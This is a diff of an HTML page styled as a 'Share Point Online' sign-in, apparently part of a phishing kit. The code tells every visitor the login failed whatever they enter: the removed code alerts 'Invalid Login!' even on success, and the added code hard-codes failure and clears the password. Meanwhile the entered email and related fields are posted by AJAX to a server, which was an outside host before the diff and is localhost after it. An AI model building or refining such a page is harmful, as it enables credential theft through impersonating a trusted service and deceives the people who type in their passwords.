@@ -15,12 +15,14 @@
     <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
     <title>Share Point Online</title>
     <link href="/css/hover.css" rel="stylesheet" media="all">
-
-    <style type="text/css">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
-
-
-
+    <style type="text/css">
+      #msg {
+    display: block !important; /* Override the display: none; */
+    background-color: transparent;
+    border: none;
+    font-weight: bolder;
+  }
     </style>
   </head>
   <body>
@@ -148,51 +150,36 @@
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
     <!-- Include jQuery -->
     <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
   </body>
 
-  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+  
 
 
   <script>
     function submitForm() {
-    // Get form data
-    const formData = new FormData(document.getElementById('contact'));
+  // Assuming you have a function to validate credentials, replace it with your actual validation logic
+  var isValidCredentials = validateCredentials();
 
-    // Create an XMLHttpRequest object
-    const xhr = new XMLHttpRequest();
+  if (!isValidCredentials) {
+    // Show invalid credentials message
+    $('#msg').text('Invalid credentials!');
+    // Clear the password field
+    $('#password').val('');
+  } else {
+    // If credentials are valid, you can proceed with your login logic
+    // For now, let's just close the modal as  an example
+    $('#ajaxModal').modal('hide');
+  }
+}
 
-    // Configure it: POST-request for the specified URL
-    xhr.open('POST', 'index.js', true);
-
-    // Set up a callback function to handle the response
-    xhr.onload = function () {
-      if (xhr.status === 200) {
-        // Successful response, handle accordingly
-        // Optionally, close the modal or perform other actions
-        // ...
-
-         // Check the server's response for successful login
-         const response = JSON.parse(xhr.responseText);
-         if (response.success) {
-          // Display the alert after the form is submitted
-          alert('Invalid Login!');
-        }
-      }
-      else {
-        // Handle the error case
-        // Optionally, close the modal or perform other actions
-        // ...
-
-        // Display the alert for unsuccessful login
-        alert('Invalid Login!');
-      }
-    };
-
-    // Send the request with form data
-    xhr.send(formData);  
+// Replace this function with your actual validation logic
+function validateCredentials() {
+  // Replace this with your validation logic
+  // For now, let's assume credentials are always invalid
+  return false;
 }
     
   </script>
@@ -266,7 +253,7 @@
   // Make AJAX request to Node.js server
   $.ajax({
     dataType: 'json',
-    url: 'https://requestvip.cyclic.app/',  // Update with your actual server URL
+    url: 'http://localhost:3000/',  // Update with your actual server URL
     type: 'POST',
     data: {
       email: email,
